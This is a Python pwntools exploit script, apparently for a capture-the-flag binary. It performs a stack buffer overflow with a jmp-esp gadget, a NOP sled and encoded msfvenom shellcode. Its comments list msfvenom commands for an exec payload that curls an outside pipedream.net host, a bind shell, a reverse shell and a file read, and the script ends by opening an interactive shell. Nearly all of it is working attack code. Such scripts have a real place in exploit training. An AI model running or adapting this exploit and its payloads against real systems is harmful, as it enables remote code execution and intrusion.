from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './server'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Offset to EIP
padding = 76

# Assemble the byte sequence for 'jmp esp' so we can search for it
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

# msfvenom -p linux/x86/exec CMD="curl https://en4i3omt29wvgco.m.pipedream.net" -b '\x00' -f python
# msfvenom -p linux/x86/shell_bind_tcp PORT=1337 -b '\x00' -f python
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b '\x00' -f python
# msfvenom -p linux/x86/read_file PATH=flag.txt FD=2 -b '\x00' -f python

# Exploit
buf = b""
buf += b"\xdb\xd2\xd9\x74\x24\xf4\x5f\x31\xc9\xb1\x12\xb8\x16"
buf += b"\xa5\xa5\xca\x31\x47\x19\x83\xef\xfc\x03\x47\x15\xf4"
buf += b"\x50\x4e\xfc\x40\x9f\x91\x01\xb0\xfb\xa0\xc8\x7d\x7b"
buf += b"\x4b\x09\xc5\x7f\x4c\x8e\x35\x09\xab\x07\xcc\xb3\x34"
buf += b"\x08\x2e\xc4\xf9\xa8\xa7\x06\xb9\xad\xb7\x86\xba\x16"
buf += b"\xb5\x86\xba\x68\x74\x06\x02\x69\x86\x07\x73\xd1\x86"
buf += b"\x07\x73\x25\x4b\x87\x9b\xe0\xac\x77\xa4\x8d\x3e\xe9"
buf += b"\x3c\x7c\xca\x91\xb6\x80"

# Build payload
payload = flat(
    asm('nop') * padding,
    jmp_esp,
    asm('nop') * 16,
    buf
)

# Write payload to file
write("payload", payload)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()
